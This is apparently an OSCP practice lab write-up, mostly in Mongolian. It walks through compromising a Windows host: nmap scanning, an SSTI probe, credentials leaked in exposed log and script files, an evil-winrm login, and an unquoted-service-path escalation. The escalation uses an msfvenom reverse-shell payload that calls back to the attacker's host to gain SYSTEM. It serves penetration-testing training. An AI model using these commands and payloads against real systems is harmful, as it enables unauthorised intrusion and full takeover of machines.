# OSCP Standalone - 2

## Nmap

```bash
nmap -A -T4 192.168.110.112 -v -p-
```

First checked SMB guest share - ямарч сонирхолтой зүйл байгаагүй тул дараагийн шалгах зүйл маань 80, 443 port байсан.

## Web Enumeration

Эхлээд LFI / RCE хийж болох аргуудыг туршиж үзсэн бага зэрэг серверийн error мессежүүд надад харагдсан.

PHP Twig ажиллаж байгаа гэдгийг 443 порт руу хандаж мэдэж авсан. Twig SSTI ажиллах боломжтой гэж үзсэн юм.

Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md

`{{7*7}}`

## Credentials from app.log

443 портийн орчин буруу тохируулагдсан байгааг анзаарч эхний ээлжинд app.log файлыг `https://192.168.110.112/logs/app.log` directory-оос олсон:

```
[2025-12-01 15:40:21] retail.DEBUG: Body: 'array (
  'email' => 'admin@oscp.exam',
  'password' => 'AdminIsCool123',
) [] {"uid":"f00f8f7"}
```

## Real Credentials from simulate.ps1

Дахин 443 порт руу чиглэсэн enumeration хийсэн бөгөөд эцэст нь `https://192.168.110.112/src/content/faq/simulate.ps1` directory-оос жинхэнэ нэвтрэх эрхийг олж авсан.

**gilbert : MexicoPortionTakeFree812**

## Shell as Gilbert

```bash
evil-winrm -i 192.168.110.112 -u gilbert -p MexicoPortionTakeFree812
```

### Suspicious XSS function

```
C:\windows\system32\cmd.exe /c powershell -exec bypass -file C:\xampp\htdocs\src\content\faq\simulate.ps1
```

## Privilege Escalation: Unquoted Service Path

SysGauge Server нь unquoted эмзэг байдалд өртсөнийг мэдсэн.

Reference: https://www.exploit-db.com/exploits/50009

```bash
sc qc "SysGauge Server"
```

Program Files (x86) нь writeable (W) эрхтэй:

```bash
icacls "C:\Program Files (x86)"
```

### Generating malicious exe

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.110 LPORT=443 -f exe -o shell.exe
```

SysGauge.exe, Server.exe -г тус тус үүсгэсэн. 2 боломж бидэн рүү холболт илгээх боломжтой.

### Shell as SYSTEM

```bash
sc start "SysGauge Server"
```

Boom!!!
